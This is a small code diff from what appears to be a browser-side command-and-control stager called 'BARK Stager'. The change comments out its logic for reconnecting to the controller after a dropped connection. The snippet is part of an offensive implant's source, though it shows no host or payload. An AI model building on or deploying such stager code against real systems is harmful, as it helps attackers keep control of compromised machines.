@@ -106,10 +106,10 @@
                 console.log("[BARK Stager] Connection closed:", event.code, event.reason);
                 
                 // Attempt to reconnect after delay if this wasn't a normal closure
-                if (event.code !== 1000) {
-                    console.log("[BARK Stager] Attempting to reconnect in 30 seconds...");
-                    setTimeout(connectToC2, 30000);
-                }
+                // if (event.code !== 1000) {
+                //     console.log("[BARK Stager] Attempting to reconnect in 30 seconds...");
+                //     setTimeout(connectToC2, 30000);
+                // }
             });
             
             return socket;
